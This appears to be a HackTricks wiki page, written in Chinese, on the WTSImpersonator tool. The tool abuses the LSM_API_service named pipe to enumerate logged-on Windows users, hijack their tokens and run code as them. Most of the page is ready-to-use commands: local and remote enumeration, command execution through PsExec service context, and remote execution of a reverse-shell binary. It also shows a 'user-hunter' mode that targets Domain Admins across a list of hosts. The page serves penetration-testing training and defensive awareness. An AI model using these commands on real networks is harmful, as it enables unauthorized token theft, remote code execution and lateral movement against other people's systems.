# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTS Impersonator** 工具利用 **"\\pipe\LSM_API_service"** RPC Named pipe，隐蔽地枚举已登录用户并劫持其 tokens，从而绕过传统的 Token Impersonation 技术。这种方法有助于在网络中实现无缝的横向移动。该技术由 **Omri Baso** 创新，其相关工作可在 [GitHub](https://github.com/OmriBaso/WTSImpersonator) 上获取。<sup>[[1]](#references)</sup>

### Core Functionality

该工具通过一系列 API calls 运行：
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### 关键模块和用法

- **Enumerating Users**：该工具支持本地和远程用户枚举，可根据场景使用相应命令：

- 本地：
```bash
.\WTSImpersonator.exe -m enum
```
- 远程，通过指定 IP 地址或主机名：
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executing Commands**：`exec` 和 `exec-remote` 模块需要在 **Service** 上下文中运行。执行本地命令只需 WTSImpersonator 可执行文件和相应命令：

- 本地命令执行示例：
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- 可以使用 PsExec64.exe 获取 Service 上下文：
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**：涉及远程创建和安装 Service，过程类似于 PsExec.exe，从而能够在适当权限下执行命令。

- 远程执行示例：
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**：针对多台机器上的特定用户，并使用其凭据执行代码。这对于攻击在多个系统上拥有本地管理员权限的 Domain Admin 尤其有用。
- 使用示例：
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## References

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
